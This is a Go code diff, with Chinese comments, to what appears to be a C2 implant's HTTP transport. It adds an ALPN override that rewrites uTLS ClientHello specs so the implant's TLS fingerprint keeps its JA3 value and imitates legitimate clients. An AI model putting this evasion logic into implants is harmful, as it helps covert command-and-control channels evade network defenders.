@@ -47,6 +47,7 @@ import (
 var (
 	tlsClientHelloID  = "{{.HTTPC2ImplantConfig.TlsClientHelloID}}"
 	tlsCustomSpecJSON = `{{.HTTPC2ImplantConfig.TlsCustomSpecJSON}}`
+	tlsAlpnOverride   = "{{.HTTPC2ImplantConfig.TlsAlpnOverride}}"
 )
 
 var (
@@ -122,18 +123,62 @@ func tlsClientHelloPresets() map[string]utls.ClientHelloID {
 
 // resolveClientHello - 解析 profile 中的指纹配置。
 // 优先级:TlsCustomSpecJSON(Tier 2)> TlsClientHelloID(Tier 1)。
+// TlsAlpnOverride 非空时,把预设物化为 spec 并重写 ALPN 扩展值(扩展 ID 列表
+// 不变,JA3 不受影响;JA4 的 alpn 字段反映新值)。
 func resolveClientHello() (utls.ClientHelloID, *utls.ClientHelloSpec, error) {
 	if strings.TrimSpace(tlsCustomSpecJSON) != "" {
 		spec := &utls.ClientHelloSpec{}
 		if err := spec.UnmarshalJSON([]byte(tlsCustomSpecJSON)); err != nil {
 			return utls.ClientHelloID{}, nil, fmt.Errorf("%w: %s", ErrInvalidTLSSpec, err)
 		}
+		if alpn := parseAlpnOverride(); alpn != nil {
+			rewriteALPN(spec, alpn)
+		}
 		return utls.HelloCustom, spec, nil
 	}
-	if id, ok := tlsClientHelloPresets()[tlsClientHelloID]; ok {
-		return id, nil, nil
+	id, ok := tlsClientHelloPresets()[tlsClientHelloID]
+	if !ok {
+		return utls.ClientHelloID{}, nil, fmt.Errorf("%w: %q", ErrUnknownTLSHello, tlsClientHelloID)
 	}
-	return utls.ClientHelloID{}, nil, fmt.Errorf("%w: %q", ErrUnknownTLSHello, tlsClientHelloID)
+	if alpn := parseAlpnOverride(); alpn != nil {
+		// 物化预设 spec。randomized 系列无法物化(运行时生成),服务端已禁止该组合。
+		spec, err := utls.UTLSIdToSpec(id)
+		if err != nil {
+			return utls.ClientHelloID{}, nil, fmt.Errorf("%w: %s", ErrUnknownTLSHello, err)
+		}
+		rewriteALPN(&spec, alpn)
+		return utls.HelloCustom, &spec, nil
+	}
+	return id, nil, nil
+}
+
+// parseAlpnOverride - 解析逗号分隔的 ALPN token 列表;未配置时返回 nil
+func parseAlpnOverride() []string {
+	if strings.TrimSpace(tlsAlpnOverride) == "" {
+		return nil
+	}
+	protocols := []string{}
+	for _, token := range strings.Split(tlsAlpnOverride, ",") {
+		token = strings.TrimSpace(token)
+		if token != "" {
+			protocols = append(protocols, token)
+		}
+	}
+	if len(protocols) == 0 {
+		return nil
+	}
+	return protocols
+}
+
+// rewriteALPN - 就地替换 spec 中 ALPNExtension 的协议值;spec 无 ALPN 扩展时保持不变
+// (追加会改变扩展顺序进而改变 JA3,故不做追加)。
+func rewriteALPN(spec *utls.ClientHelloSpec, protocols []string) {
+	for _, ext := range spec.Extensions {
+		if alpn, ok := ext.(*utls.ALPNExtension); ok {
+			alpn.AlpnProtocols = protocols
+			return
+		}
+	}
 }
 
 // utlsDialTLSContext - 返回 http.Transport.DialTLSContext 实现。
